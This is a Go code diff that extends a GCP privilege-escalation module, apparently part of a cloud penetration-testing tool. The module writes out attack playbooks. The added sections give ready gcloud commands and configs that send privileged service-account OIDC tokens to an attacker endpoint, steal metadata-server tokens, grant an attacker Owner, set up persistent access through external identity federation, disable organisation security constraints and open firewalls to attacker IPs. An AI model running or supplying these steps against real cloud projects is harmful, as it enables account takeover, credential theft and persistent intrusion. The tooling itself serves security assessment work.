@@ -205,14 +205,17 @@ func (m *PrivescModule) generatePlaybookSections() string {
 		"Compute":           {},
 		"Serverless":        {},
 		"Data Processing":   {},
+		"AI/ML":             {},
 		"Orchestration":     {},
 		"CI/CD":             {},
+		"IaC":               {},
 		"GKE":               {},
 		"Secrets":           {},
-		"Deployment":        {},
 		"Federation":        {},
 		"Org Policy":        {},
+		"Network Access":    {},
 		"SA Usage":          {},
+		"Billing":           {},
 	}
 
 	for _, path := range m.AllPaths {
@@ -473,6 +476,186 @@ func (m *PrivescModule) generatePlaybookSections() string {
 		sections.WriteString("gcloud composer environments storage dags import \\\n")
 		sections.WriteString("    --environment=pwned --location=us-central1 \\\n")
 		sections.WriteString("    --source=malicious_dag.py\n")
+		sections.WriteString("```\n\n")
+		sections.WriteString("### Exploitation - Cloud Scheduler:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create scheduled job that runs with target SA (OIDC auth)\n")
+		sections.WriteString("gcloud scheduler jobs create http privesc-job \\\n")
+		sections.WriteString("    --schedule='* * * * *' \\\n")
+		sections.WriteString("    --uri='https://ATTACKER_CONTROLLED_ENDPOINT/receive' \\\n")
+		sections.WriteString("    --oidc-service-account-email=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \\\n")
+		sections.WriteString("    --location=us-central1\n\n")
+		sections.WriteString("# The endpoint receives requests with an OIDC token signed by the SA\n")
+		sections.WriteString("# Extract the token from the Authorization header\n")
+		sections.WriteString("```\n\n")
+		sections.WriteString("### Exploitation - Cloud Tasks:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create task queue\n")
+		sections.WriteString("gcloud tasks queues create privesc-queue --location=us-central1\n\n")
+		sections.WriteString("# Create HTTP task with OIDC token\n")
+		sections.WriteString("gcloud tasks create-http-task \\\n")
+		sections.WriteString("    --queue=privesc-queue \\\n")
+		sections.WriteString("    --url='https://ATTACKER_CONTROLLED_ENDPOINT/receive' \\\n")
+		sections.WriteString("    --oidc-service-account-email=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \\\n")
+		sections.WriteString("    --location=us-central1\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// AI/ML
+	if len(categories["AI/ML"]) > 0 {
+		sections.WriteString("## AI/ML Platform Exploitation\n\n")
+		sections.WriteString("Principals with AI/ML permissions can create notebooks or training jobs that run as privileged SAs.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["AI/ML"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
+		}
+		sections.WriteString("\n### Exploitation - Vertex AI Workbench:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create notebook instance with privileged SA\n")
+		sections.WriteString("gcloud notebooks instances create privesc-notebook \\\n")
+		sections.WriteString("    --location=us-central1-a \\\n")
+		sections.WriteString("    --machine-type=n1-standard-4 \\\n")
+		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n\n")
+		sections.WriteString("# Access the notebook via JupyterLab UI or proxy\n")
+		sections.WriteString("gcloud notebooks instances describe privesc-notebook --location=us-central1-a\n\n")
+		sections.WriteString("# In the notebook, steal the SA token:\n")
+		sections.WriteString("# import requests\n")
+		sections.WriteString("# r = requests.get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',\n")
+		sections.WriteString("#                  headers={'Metadata-Flavor': 'Google'})\n")
+		sections.WriteString("# print(r.json()['access_token'])\n")
+		sections.WriteString("```\n\n")
+		sections.WriteString("### Exploitation - Vertex AI Custom Jobs:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create custom training job with privileged SA\n")
+		sections.WriteString("gcloud ai custom-jobs create \\\n")
+		sections.WriteString("    --region=us-central1 \\\n")
+		sections.WriteString("    --display-name=privesc-job \\\n")
+		sections.WriteString("    --worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=gcr.io/PROJECT/token-stealer \\\n")
+		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// IaC (Infrastructure as Code)
+	if len(categories["IaC"]) > 0 {
+		sections.WriteString("## Infrastructure as Code Exploitation\n\n")
+		sections.WriteString("Principals with IaC permissions can deploy infrastructure using the Deployment Manager service account.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["IaC"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
+		}
+		sections.WriteString("\n### Exploitation - Deployment Manager:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create deployment config that grants attacker Owner role\n")
+		sections.WriteString("cat > privesc-config.yaml << 'EOF'\n")
+		sections.WriteString("resources:\n")
+		sections.WriteString("- name: privesc-binding\n")
+		sections.WriteString("  type: gcp-types/cloudresourcemanager-v1:virtual.projects.iamMemberBinding\n")
+		sections.WriteString("  properties:\n")
+		sections.WriteString("    resource: PROJECT_ID\n")
+		sections.WriteString("    role: roles/owner\n")
+		sections.WriteString("    member: user:attacker@example.com\n")
+		sections.WriteString("EOF\n\n")
+		sections.WriteString("# Deploy - runs as [PROJECT_NUMBER]@cloudservices.gserviceaccount.com\n")
+		sections.WriteString("# This SA typically has Editor role on the project\n")
+		sections.WriteString("gcloud deployment-manager deployments create privesc-deploy \\\n")
+		sections.WriteString("    --config=privesc-config.yaml\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Federation (Workload Identity)
+	if len(categories["Federation"]) > 0 {
+		sections.WriteString("## Workload Identity Federation Exploitation\n\n")
+		sections.WriteString("Principals with federation permissions can create identity pools that allow external identities to impersonate GCP service accounts.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Federation"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create workload identity pool\n")
+		sections.WriteString("gcloud iam workload-identity-pools create attacker-pool \\\n")
+		sections.WriteString("    --location=global \\\n")
+		sections.WriteString("    --display-name='Attacker Pool'\n\n")
+		sections.WriteString("# Create OIDC provider pointing to attacker-controlled IdP\n")
+		sections.WriteString("gcloud iam workload-identity-pools providers create-oidc attacker-provider \\\n")
+		sections.WriteString("    --location=global \\\n")
+		sections.WriteString("    --workload-identity-pool=attacker-pool \\\n")
+		sections.WriteString("    --issuer-uri='https://attacker-idp.example.com' \\\n")
+		sections.WriteString("    --attribute-mapping='google.subject=assertion.sub'\n\n")
+		sections.WriteString("# Grant the pool's identities ability to impersonate a SA\n")
+		sections.WriteString("gcloud iam service-accounts add-iam-policy-binding \\\n")
+		sections.WriteString("    PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \\\n")
+		sections.WriteString("    --role=roles/iam.workloadIdentityUser \\\n")
+		sections.WriteString("    --member='principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/attacker-pool/*'\n\n")
+		sections.WriteString("# Now authenticate from external system and get GCP token\n")
+		sections.WriteString("# This allows persistent access from outside GCP\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Org Policy
+	if len(categories["Org Policy"]) > 0 {
+		sections.WriteString("## Organization Policy Exploitation\n\n")
+		sections.WriteString("Principals with org policy permissions can disable security constraints across the organization.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Org Policy"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Disable domain restricted sharing constraint\n")
+		sections.WriteString("cat > policy.yaml << 'EOF'\n")
+		sections.WriteString("constraint: constraints/iam.allowedPolicyMemberDomains\n")
+		sections.WriteString("listPolicy:\n")
+		sections.WriteString("  allValues: ALLOW\n")
+		sections.WriteString("EOF\n")
+		sections.WriteString("gcloud org-policies set-policy policy.yaml --project=PROJECT_ID\n\n")
+		sections.WriteString("# Disable service account key creation constraint\n")
+		sections.WriteString("cat > policy.yaml << 'EOF'\n")
+		sections.WriteString("constraint: constraints/iam.disableServiceAccountKeyCreation\n")
+		sections.WriteString("booleanPolicy:\n")
+		sections.WriteString("  enforced: false\n")
+		sections.WriteString("EOF\n")
+		sections.WriteString("gcloud org-policies set-policy policy.yaml --project=PROJECT_ID\n\n")
+		sections.WriteString("# Disable VM external IP constraint\n")
+		sections.WriteString("cat > policy.yaml << 'EOF'\n")
+		sections.WriteString("constraint: constraints/compute.vmExternalIpAccess\n")
+		sections.WriteString("listPolicy:\n")
+		sections.WriteString("  allValues: ALLOW\n")
+		sections.WriteString("EOF\n")
+		sections.WriteString("gcloud org-policies set-policy policy.yaml --project=PROJECT_ID\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Network Access
+	if len(categories["Network Access"]) > 0 {
+		sections.WriteString("## Network Access Exploitation\n\n")
+		sections.WriteString("Principals with network access permissions can create tunnels or modify firewall rules to access internal resources.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Network Access"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
+		}
+		sections.WriteString("\n### Exploitation - IAP Tunnel:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Start IAP tunnel to SSH port\n")
+		sections.WriteString("gcloud compute start-iap-tunnel INSTANCE_NAME 22 \\\n")
+		sections.WriteString("    --local-host-port=localhost:2222 \\\n")
+		sections.WriteString("    --zone=us-central1-a\n\n")
+		sections.WriteString("# SSH through the tunnel\n")
+		sections.WriteString("ssh -p 2222 user@localhost\n\n")
+		sections.WriteString("# Or use gcloud directly\n")
+		sections.WriteString("gcloud compute ssh INSTANCE_NAME --zone=us-central1-a --tunnel-through-iap\n")
+		sections.WriteString("```\n\n")
+		sections.WriteString("### Exploitation - Firewall Rules:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create firewall rule allowing attacker IP\n")
+		sections.WriteString("gcloud compute firewall-rules create allow-attacker \\\n")
+		sections.WriteString("    --network=default \\\n")
+		sections.WriteString("    --allow=tcp:22,tcp:3389,tcp:443 \\\n")
+		sections.WriteString("    --source-ranges=ATTACKER_IP/32 \\\n")
+		sections.WriteString("    --target-tags=all-instances\n\n")
+		sections.WriteString("# Modify existing rule to allow more access\n")
+		sections.WriteString("gcloud compute firewall-rules update RULE_NAME \\\n")
+		sections.WriteString("    --source-ranges=0.0.0.0/0\n")
 		sections.WriteString("```\n\n")
 	}
 
